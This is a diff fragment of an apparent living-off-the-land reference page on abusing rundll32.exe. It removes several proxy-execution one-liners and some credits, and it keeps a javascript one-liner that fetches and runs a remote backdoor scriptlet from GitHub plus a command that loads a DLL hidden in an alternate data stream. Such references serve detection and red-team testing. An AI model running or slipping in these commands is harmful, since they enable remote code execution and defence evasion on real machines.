@@ -13,35 +13,11 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
 
-rundll32 shell32.dll,Control_RunDLL payload.dll
-
-rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
-
-rundll32.exe advpack.dll,RegisterOCX calc.exe
-
-rundll32.exe zipfldr.dll,RouteTheCall calc.exe
-
-rundll32.exe url.dll,OpenURL "C:\test\calc.hta"
-
-rundll32.exe url.dll,OpenURL "C:\test\calc.url"
-
-rundll32.exe url.dll, FileProtocolHandler calc.exe
-
-rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"
-
-rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"
-
-rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,   
-     
 rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain   
 ```
   
 Acknowledgements:
 * Casey Smith - @subtee
-* Jimmy - @bohops
-* Moriarty - @Moriarty_Meng
-* Adam - @hexacorn
-* Oddvar Moe - @oddvarmoe
 
 Code sample:
 * [AllTheThingsx64.dll](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/AllTheThings/AllTheThingsx64.dll)[1]     
